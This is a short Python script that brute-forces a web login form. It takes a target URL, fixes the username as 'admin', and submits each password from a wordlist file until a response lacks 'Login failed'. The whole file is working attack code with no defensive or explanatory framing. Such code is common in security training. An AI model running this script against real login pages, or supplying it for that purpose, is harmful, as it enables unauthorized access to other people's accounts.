import requests

target_url = input("input target url: ")
data_dict = {"username": "admin", "password": "", "Login": "submit"}

with open("password.list", "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data=data_dict)
        if "Login failed" not in response.content.decode():
            print("[+] Got the password --> " + word)
            exit()

print("[+] Reached end of line.")
